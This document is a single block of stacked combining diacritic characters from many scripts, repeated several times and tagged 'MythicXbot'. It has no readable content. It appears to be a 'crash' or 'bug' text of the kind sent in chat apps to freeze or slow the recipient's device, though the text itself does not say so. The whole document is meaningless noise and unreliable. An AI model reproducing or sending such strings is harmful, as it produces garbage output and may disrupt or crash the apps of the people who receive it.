͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܻܻܻܻܻܻܻܻܻܻ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉